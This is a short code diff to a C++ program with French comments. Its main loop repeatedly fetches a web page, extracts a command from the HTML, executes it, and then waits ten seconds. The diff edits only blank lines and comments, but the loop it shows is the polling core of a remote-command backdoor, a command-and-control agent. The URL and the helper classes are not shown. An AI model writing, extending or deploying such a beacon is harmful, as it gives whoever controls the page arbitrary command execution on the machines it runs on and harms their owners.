@@ -17,7 +17,6 @@ int main() {
     HtmlParser htmlParser(cmd);
 
     while (true) {
-        
 
         // Effectuer la requête et extraire le contenu
         std::string response = httpRequest.get(url, userAgent);
@@ -39,9 +38,12 @@ int main() {
             // Exécuter la dernière commande
             ExecCmd execCmd(cmd);
             execCmd.executeLastCmd();
+
+            // Effacer la dernière commande après l'exécution
+
         }
-        // Attendre une minute
         std::this_thread::sleep_for(std::chrono::seconds(10));
+
     }
 
     return 0;
